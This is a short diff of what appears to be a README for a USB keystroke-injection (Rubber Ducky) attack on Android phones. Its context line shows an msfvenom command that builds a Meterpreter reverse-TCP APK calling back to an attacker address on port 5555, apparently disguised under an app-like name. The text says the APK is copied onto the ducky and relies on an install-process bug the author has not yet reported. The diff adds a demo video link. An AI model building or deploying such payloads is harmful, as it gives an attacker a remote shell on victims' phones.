@@ -15,4 +15,9 @@ msfvenom -p android/meterpreter_reverse_tcp LHOST=YOUR_ADDRESS LPORT=5555 -o WHA
 
 The APK file must then be copied to the ducky along side the bin file you place there as well.
 
-These payloads rely on a bug I found and will be reporting, within the APP install process
+The APK payloads rely on a bug I found and will be reporting soon, within the APP install process
+
+[SWIPE TO OPEN DEMO]
+
+[![IMAGE ALT TEXT HERE](https://i.ibb.co/Yh2D6Vt/swipe.png)](https://youtu.be/Hon9YmdVehQ)
+
